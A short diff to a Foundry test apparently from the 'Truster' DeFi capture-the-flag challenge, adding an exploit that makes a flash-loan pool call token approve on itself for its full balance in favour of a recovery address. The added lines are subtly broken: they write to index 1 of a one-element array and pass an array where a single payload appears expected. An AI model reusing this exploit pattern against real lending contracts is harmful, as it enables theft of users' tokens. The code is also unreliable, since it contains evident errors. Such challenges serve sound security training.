@@ -51,6 +51,10 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
+        bytes[] memory data = new bytes[](1);
+
+        data[1] = abi.encodeWithSignature("approve(address,uint256)", address(recovery),TOKENS_IN_POOL);
+        pool.flashLoan(0,address(deployer),address(token),data);
         
     }
 
